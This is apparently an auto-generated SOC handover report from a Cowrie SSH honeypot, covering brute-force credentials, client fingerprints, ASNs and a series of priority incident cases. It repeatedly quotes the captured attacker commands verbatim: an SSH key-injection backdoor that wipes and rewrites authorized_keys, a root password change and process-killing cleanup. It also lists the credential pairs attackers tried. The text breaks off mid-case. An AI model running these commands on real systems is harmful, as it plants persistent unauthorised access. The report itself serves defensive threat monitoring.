# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-16 |
| **Generated At** | 2026-04-16T15:44:39Z |
| **Shift Time** | 15:44 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **151** |
| Confirmed Threats | **123** |
| False Positives Filtered | **28** (18.5%) |
| Unique Attacker IPs | **9** |
| Countries of Origin | **8** |
| High Severity Cases | **47** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **104** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **95** |
| Unique Credential Pairs | **51** |
| Unique Usernames | **18** |
| Unique Passwords | **51** |
| Successful Auth Pairs | **26** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 47 |
| `345gs5662d34` | 23 |
| `ubuntu` | 8 |
| `test` | 2 |
| `claude` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 23 |
| `3245gs5662d34` | 23 |
| `DDxx111` | 1 |
| `ali!2026` | 1 |
| `testing` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 23 |
| `root` | `3245gs5662d34` | 23 |
| `root` | `DDxx111` | 1 |
| `ali` | `ali!2026` | 1 |
| `info` | `testing` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `DDxx111` | `125.138.175.113` | 2026-04-16T13:56:57 |
| `root` | `3245gs5662d34` | `125.138.175.113` | 2026-04-16T13:57:01 |
| `root` | `Root2026..` | `125.138.175.113` | 2026-04-16T14:04:00 |
| `root` | `passW0rd` | `125.138.175.113` | 2026-04-16T14:10:56 |
| `root` | `Qazwsx54321` | `125.138.175.113` | 2026-04-16T14:12:46 |
| `root` | `ASDzxc123` | `125.138.175.113` | 2026-04-16T14:14:32 |
| `root` | `Admin@123!@#` | `125.138.175.113` | 2026-04-16T14:19:37 |
| `root` | `ZZcc123` | `125.138.175.113` | 2026-04-16T14:23:01 |
| `root` | `bbAA123123` | `125.138.175.113` | 2026-04-16T14:24:48 |
| `root` | `BHU*nji9` | `125.138.175.113` | 2026-04-16T14:28:38 |
| `root` | `qwe#1` | `120.48.181.192` | 2026-04-16T14:39:37 |
| `root` | `Huawei@123456` | `102.88.137.145` | 2026-04-16T14:40:16 |
| `root` | `3245gs5662d34` | `102.88.137.145` | 2026-04-16T14:40:23 |
| `root` | `Qwertyuiop1234` | `102.88.137.145` | 2026-04-16T14:42:08 |
| `root` | `123456_qwerty` | `102.88.137.145` | 2026-04-16T14:44:04 |
| `root` | `root1234567#` | `102.88.137.145` | 2026-04-16T14:47:51 |
| `root` | `qazwsx8888!@` | `102.88.137.145` | 2026-04-16T14:49:47 |
| `root` | `qwertqwert12345` | `102.88.137.145` | 2026-04-16T14:51:46 |
| `root` | `1234a` | `102.88.137.145` | 2026-04-16T14:53:40 |
| `root` | `123456-ZXCV` | `102.88.137.145` | 2026-04-16T14:55:33 |
| `root` | `bbBB123` | `102.88.137.145` | 2026-04-16T14:57:28 |
| `root` | `01` | `102.88.137.145` | 2026-04-16T15:03:04 |
| `root` | `tesTtest123a` | `102.88.137.145` | 2026-04-16T15:05:07 |
| `root` | `1qaz2wsx3edc@123` | `102.88.137.145` | 2026-04-16T15:08:49 |
| `root` | `noroot` | `102.88.137.145` | 2026-04-16T15:14:29 |
| `root` | `12345-QWER` | `102.88.137.145` | 2026-04-16T15:16:24 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **151** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 121 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 114 | 4 |
| `e54ef3ec27fe...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 114 | 4 | Modern SSH client |
| `95420f9d932d...` | libssh | 7 | 1 | — |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 23 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:OkOmoZxroE5i"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.181.192`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `125.138.175.113`, `102.88.137.145`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **9** |
| Unique ASNs | **9** |
| High-Risk ASNs | **5** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS138245` | Xpress Net Solution | 1 | MEDIUM |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS2527` | Sony Network Communications Inc. | 1 | HIGH |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS24940` | Hetzner Online GmbH | 1 | LOW |
| `AS29465` | MTN NIGERIA Communication limited | 1 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |
| `AS396982` | Google LLC | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (47)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-07e67222566c

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-04-16 13:56 |
| **Last Seen** | 2026-04-16 13:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 13:56:57` | `cowrie.session.connect` |
| `2026-04-16 13:56:57` | `cowrie.client.version` |
| `2026-04-16 13:56:57` | `cowrie.client.kex` |
| `2026-04-16 13:56:57` | `cowrie.login.success` |
| `2026-04-16 13:56:58` | `cowrie.session.params` |
| `2026-04-16 13:56:58` | `cowrie.command.input` |
| `2026-04-16 13:56:58` | `cowrie.command.failed` |
| `2026-04-16 13:56:58` | `cowrie.log.closed` |
| `2026-04-16 13:56:58` | `cowrie.session.params` |
| `2026-04-16 13:56:58` | `cowrie.command.input` |
| `2026-04-16 13:56:58` | `cowrie.session.file_download` |
| `2026-04-16 13:56:58` | `cowrie.log.closed` |
| `2026-04-16 13:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-259d5805377a

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-04-16 13:57 |
| **Last Seen** | 2026-04-16 13:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 13:57:00` | `cowrie.session.connect` |
| `2026-04-16 13:57:00` | `cowrie.client.version` |
| `2026-04-16 13:57:01` | `cowrie.client.kex` |
| `2026-04-16 13:57:01` | `cowrie.login.success` |
| `2026-04-16 13:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ea39122890c

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-04-16 14:03 |
| **Last Seen** | 2026-04-16 14:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:03:59` | `cowrie.session.connect` |
| `2026-04-16 14:03:59` | `cowrie.client.version` |
| `2026-04-16 14:03:59` | `cowrie.client.kex` |
| `2026-04-16 14:04:00` | `cowrie.login.success` |
| `2026-04-16 14:04:00` | `cowrie.session.params` |
| `2026-04-16 14:04:00` | `cowrie.command.input` |
| `2026-04-16 14:04:00` | `cowrie.command.failed` |
| `2026-04-16 14:04:00` | `cowrie.log.closed` |
| `2026-04-16 14:04:01` | `cowrie.session.params` |
| `2026-04-16 14:04:01` | `cowrie.command.input` |
| `2026-04-16 14:04:01` | `cowrie.session.file_download` |
| `2026-04-16 14:04:01` | `cowrie.log.closed` |
| `2026-04-16 14:04:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8ca95aa102f

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-04-16 14:04 |
| **Last Seen** | 2026-04-16 14:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:04:03` | `cowrie.session.connect` |
| `2026-04-16 14:04:03` | `cowrie.client.version` |
| `2026-04-16 14:04:03` | `cowrie.client.kex` |
| `2026-04-16 14:04:04` | `cowrie.login.success` |
| `2026-04-16 14:04:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-455a6ac3c061

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-04-16 14:10 |
| **Last Seen** | 2026-04-16 14:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:10:55` | `cowrie.session.connect` |
| `2026-04-16 14:10:55` | `cowrie.client.version` |
| `2026-04-16 14:10:55` | `cowrie.client.kex` |
| `2026-04-16 14:10:56` | `cowrie.login.success` |
| `2026-04-16 14:10:56` | `cowrie.session.params` |
| `2026-04-16 14:10:56` | `cowrie.command.input` |
| `2026-04-16 14:10:56` | `cowrie.command.failed` |
| `2026-04-16 14:10:56` | `cowrie.log.closed` |
| `2026-04-16 14:10:56` | `cowrie.session.params` |
| `2026-04-16 14:10:56` | `cowrie.command.input` |
| `2026-04-16 14:10:57` | `cowrie.session.file_download` |
| `2026-04-16 14:10:57` | `cowrie.log.closed` |
| `2026-04-16 14:10:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0376b3619d44

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-04-16 14:10 |
| **Last Seen** | 2026-04-16 14:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:10:59` | `cowrie.session.connect` |
| `2026-04-16 14:10:59` | `cowrie.client.version` |
| `2026-04-16 14:10:59` | `cowrie.client.kex` |
| `2026-04-16 14:10:59` | `cowrie.login.success` |
| `2026-04-16 14:10:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bac04b93b67

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-04-16 14:12 |
| **Last Seen** | 2026-04-16 14:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:12:46` | `cowrie.session.connect` |
| `2026-04-16 14:12:46` | `cowrie.client.version` |
| `2026-04-16 14:12:46` | `cowrie.client.kex` |
| `2026-04-16 14:12:46` | `cowrie.login.success` |
| `2026-04-16 14:12:47` | `cowrie.session.params` |
| `2026-04-16 14:12:47` | `cowrie.command.input` |
| `2026-04-16 14:12:47` | `cowrie.command.failed` |
| `2026-04-16 14:12:47` | `cowrie.log.closed` |
| `2026-04-16 14:12:47` | `cowrie.session.params` |
| `2026-04-16 14:12:47` | `cowrie.command.input` |
| `2026-04-16 14:12:47` | `cowrie.session.file_download` |
| `2026-04-16 14:12:47` | `cowrie.log.closed` |
| `2026-04-16 14:12:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8bc67dac15e

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-04-16 14:12 |
| **Last Seen** | 2026-04-16 14:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:12:49` | `cowrie.session.connect` |
| `2026-04-16 14:12:49` | `cowrie.client.version` |
| `2026-04-16 14:12:50` | `cowrie.client.kex` |
| `2026-04-16 14:12:50` | `cowrie.login.success` |
| `2026-04-16 14:12:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-858b1aa64c1e

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-04-16 14:14 |
| **Last Seen** | 2026-04-16 14:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:14:31` | `cowrie.session.connect` |
| `2026-04-16 14:14:31` | `cowrie.client.version` |
| `2026-04-16 14:14:32` | `cowrie.client.kex` |
| `2026-04-16 14:14:32` | `cowrie.login.success` |
| `2026-04-16 14:14:32` | `cowrie.session.params` |
| `2026-04-16 14:14:32` | `cowrie.command.input` |
| `2026-04-16 14:14:32` | `cowrie.command.failed` |
| `2026-04-16 14:14:33` | `cowrie.log.closed` |
| `2026-04-16 14:14:33` | `cowrie.session.params` |
| `2026-04-16 14:14:33` | `cowrie.command.input` |
| `2026-04-16 14:14:33` | `cowrie.session.file_download` |
| `2026-04-16 14:14:33` | `cowrie.log.closed` |
| `2026-04-16 14:14:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-324e49096b66

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-04-16 14:14 |
| **Last Seen** | 2026-04-16 14:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:14:35` | `cowrie.session.connect` |
| `2026-04-16 14:14:35` | `cowrie.client.version` |
| `2026-04-16 14:14:35` | `cowrie.client.kex` |
| `2026-04-16 14:14:36` | `cowrie.login.success` |
| `2026-04-16 14:14:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e949ae31bcc7

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-04-16 14:19 |
| **Last Seen** | 2026-04-16 14:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:19:36` | `cowrie.session.connect` |
| `2026-04-16 14:19:36` | `cowrie.client.version` |
| `2026-04-16 14:19:36` | `cowrie.client.kex` |
| `2026-04-16 14:19:37` | `cowrie.login.success` |
| `2026-04-16 14:19:37` | `cowrie.session.params` |
| `2026-04-16 14:19:37` | `cowrie.command.input` |
| `2026-04-16 14:19:37` | `cowrie.command.failed` |
| `2026-04-16 14:19:37` | `cowrie.log.closed` |
| `2026-04-16 14:19:38` | `cowrie.session.params` |
| `2026-04-16 14:19:38` | `cowrie.command.input` |
| `2026-04-16 14:19:38` | `cowrie.session.file_download` |
| `2026-04-16 14:19:38` | `cowrie.log.closed` |
| `2026-04-16 14:19:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1feaec2f8bd8

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-04-16 14:19 |
| **Last Seen** | 2026-04-16 14:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 14:19:40` | `cowrie.session.connect` |
| `2026-04-16 14:19:40` | `cowrie.client.version` |
| `2026-04-16 14:19:40` | `cowrie.client.kex` |
| `2026-04-16 14:19:41` | `cowrie.login.success` |
| `2026-04-16 14:19:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.138.175[.]113` to AbuseIPDB if not already reported
- [ ] Block `125.138.175[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a3688ab4ddd

| Field | Detail |
|---|---|
| **Source IP** | `125.138.175[.]113` |
| **First Seen** | 2026-04-16 14:23 |
